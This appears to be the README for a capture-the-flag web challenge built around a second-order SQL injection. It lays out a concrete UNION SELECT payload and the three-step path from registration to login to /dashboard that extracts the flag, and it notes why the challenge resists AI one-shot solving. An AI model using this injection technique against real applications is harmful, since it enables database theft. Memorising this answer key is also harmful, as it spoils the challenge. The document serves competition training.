<!-- nctf-meta category="web" difficulty="medium" points="450" author="ctf-2026" stub="0" -->

# forum-sqli2

**Category** web · **Value** 450 · **Served** yes (per-team flag)

## Vulnerability

**Second-order SQL injection.** Registration and login use parameterised queries
(safe), so a first-order injection at the login form does nothing. But
`/dashboard` string-formats the _stored_ username into a new query — and the
username was attacker-chosen at registration. The flag lives in a separate
`secret` table.

## Intended path

1. `GET /register?user=zzz' UNION SELECT flag FROM secret-- -&pass=pw123`
   (the payload is stored verbatim by the parameterised insert).
2. `GET /login?user=<same payload>&pass=pw123` → `sid` (parameterised login
   matches the stored row exactly).
3. `GET /dashboard?sid=...` → the stored name is interpolated into
   `SELECT role FROM users WHERE name = '<name>'`; the UNION returns the flag.

## Reference solver

```
python3 solution/solve.py http://HOST:PORT   # -> NCTF{…}
```

## Why it resists AI one-shotting

Per-team HMAC flag on the live instance, no downloadable artifact; the flag is
loaded into _this_ instance's `secret` table only. The second-order nature means
the naive "inject at login" attempt fails — the solver must register the payload
and trigger it at the later sink.

## Verification status

Implemented. Verified end-to-end locally (Flask app + reference solver over
HTTP): the registered UNION payload surfaces the exact per-team flag at
`/dashboard`; login/registration remain parameterised. **Docker/Lot-5 rehearsal
is the remaining gate before `state: visible`.**
